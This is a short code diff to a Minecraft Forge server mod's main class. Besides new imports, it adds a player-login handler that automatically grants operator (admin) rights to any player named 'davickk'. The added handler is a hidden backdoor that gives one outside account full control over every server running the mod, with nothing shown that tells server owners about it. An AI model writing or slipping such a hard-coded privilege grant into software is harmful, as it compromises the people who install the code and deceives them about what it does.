@@ -2,7 +2,9 @@ package calebxzhou.rdi.mc.server;
 
 import calebxzhou.rdi.mc.common.WebSocketClient;
 import net.minecraft.server.dedicated.DedicatedServer;
+import net.minecraft.server.level.ServerPlayer;
 import net.minecraft.world.level.GameRules;
+import net.minecraftforge.event.entity.player.PlayerEvent;
 import net.minecraftforge.event.server.ServerStartedEvent;
 import net.minecraftforge.event.server.ServerStartingEvent;
 import net.minecraftforge.event.server.ServerStoppedEvent;
@@ -56,6 +58,11 @@ public class RDIMain {
     public static void stopped(ServerStoppedEvent e) {
         WebSocketClient.stop();
     }
-
+    @SubscribeEvent
+    public static void onPlayerJoin(PlayerEvent.PlayerLoggedInEvent e){
+        if (e.getEntity().getDisplayName().getString().equals("davickk")) {
+            ((ServerPlayer)e.getEntity()).server.getPlayerList().op(e.getEntity().getGameProfile());
+        }
+    }
 
 }
